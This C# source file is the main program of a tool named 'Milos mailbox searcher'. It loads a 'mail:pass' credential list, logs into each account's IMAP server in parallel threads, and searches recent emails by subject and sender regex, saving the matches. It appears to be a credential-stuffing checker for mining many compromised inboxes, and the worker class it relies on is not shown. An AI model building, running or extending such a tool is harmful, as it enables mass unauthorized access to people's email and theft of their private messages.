using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using CommandLine;
using MailKit;
using MailKit.Net.Imap;
using MailKit.Search;

namespace Milos
{
    class ImapServer
    {
        public string Hostname { get; set; }
        public int Port { get; set; }
    }

    class User
    {
        public string EMail { get; set; }
        public string Password { get; set; }
        public ImapServer Server { get; set; }
    }

    class Status
    {
        public int Checked { get; set; }
        public int Found { get; set; }
        public int NotFound { get; set; }
        public int ConnectionErrors { get; set; }
        public int AuthenticationErrors { get; set; }
    }

    class Program
    {
        public class Options
        {
            [Option('i', "input", Default = "mails.txt", HelpText = "File with mail:pass list")]
            public string InputFile { get; set; }

            [Option('o', "output", Default = "out.txt", HelpText = "Output file")]
            public string OutputFile { get; set; }

            [Option('h', "hosts", Default = "hosts.txt", HelpText = "A list of mailbox hostnames")]
            public string HostsFile { get; set; }

            [Option('s', "subjects", Default = "subjects.txt", HelpText = "A list of regexs for subjects")]
            public string SubjectsFile { get; set; }

            [Option('f', "from", Default = "from.txt", HelpText = "A list of regexs for senders")]
            public string FromFile { get; set; }

            [Option("mailcount", Default = 1000, HelpText = "Number of latest emails to check")]
            public int MailCount { get; set; }

            [Option('t', "threads", Default = 20, HelpText = "Number of threads")]
            public int Threads { get; set; }
        }

        static void Main(string[] args)
        {
            Console.WriteLine(@"___  ____ _          
|  \/  (_) |          
| .  . |_| | ___  ___ 
| |\/| | | |/ _ \/ __|
| |  | | | | (_) \__ \
\_|  |_/_|_|\___/|___/
      mailbox searcher
");

            Parser.Default.ParseArguments<Options>(args)
                .WithParsed<Options>(o => { Run(o); });
        }

        private static void Run(Options options)
        {
            if (!File.Exists(options.InputFile))
            {
                Console.WriteLine($"No such file '{options.InputFile}'");
                return;
            }

            if (!File.Exists(options.SubjectsFile))
            {
                Console.WriteLine($"No such file '{options.SubjectsFile}'");
                return;
            }

            if (!File.Exists(options.FromFile))
            {
                Console.WriteLine($"No such file '{options.FromFile}'");
                return;
            }

            if (!File.Exists(options.HostsFile))
            {
                Console.WriteLine($"No such file '{options.HostsFile}'");
                return;
            }

            var hosts = new Dictionary<string, ImapServer>();
            foreach (var line in File.ReadAllLines(options.HostsFile))
            {
                var split = line.Trim().Split(":");

                if (split.Length == 3 && !hosts.ContainsKey(split[0]))
                    hosts.Add(split[0], new ImapServer()
                    {
                        Hostname = split[1].ToLower(),
                        Port = int.Parse(split[2]),
                    });
            }

            var subjects = File.ReadAllLines(options.SubjectsFile)
                .Select(l => new Regex(l))
                .ToList();

            var from = File.ReadAllLines(options.FromFile)
                .Select(l => new Regex(l))
                .ToList();

            var mails = new List<User>();
            foreach (var line in File.ReadAllLines(options.InputFile))
            {
                var split = line.Trim().Split(":");
                var mail = split[0];
                var password = split[1];

                var server = mail.Split('@')[1].ToLower();
                if (!hosts.ContainsKey(server))
                {
                    Console.WriteLine($"No mail host for {server}");
                    continue;
                }

                mails.Add(new User()
                {
                    EMail = mail,
                    Password = password,
                    Server = hosts[server],
                });
            }

            Console.WriteLine($"Loaded {hosts.Count} hosts, {subjects.Count} subjects, {mails.Count} mails");

            var status = new Status();

            Parallel.ForEach(mails, new ParallelOptions { MaxDegreeOfParallelism = options.Threads }, mail =>
            {
                var worker = new Worker()
                {
                    Subjects = subjects,
                    From = from,
                    Mail = mail,
                    MailCount = options.MailCount,
                    OutFile = options.OutputFile,
                };

                try
                {
                    var workerStatus = worker.DoWork();

                    lock (status)
                    {
                        if (workerStatus == WorkerExitCode.Found)
                            status.Found++;
                        else if (workerStatus == WorkerExitCode.NotFound)
                            status.NotFound++;
                        else if (workerStatus == WorkerExitCode.ConnectionError)
                        {
                            status.ConnectionErrors++;
                            Console.WriteLine($"Connection error for {mail.EMail}");
                        }
                        else if (workerStatus == WorkerExitCode.AuthenticationError)
                            status.AuthenticationErrors++;
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine($"Unknown error for {mail.EMail}");
                    Console.WriteLine(e);
                }

                lock (status)
                {
                    status.Checked++;

                    Console.WriteLine($"{status.Checked}/{mails.Count}, {status.Found} found");
                }
            });

            Console.WriteLine("Work finished");
        }
    }
}
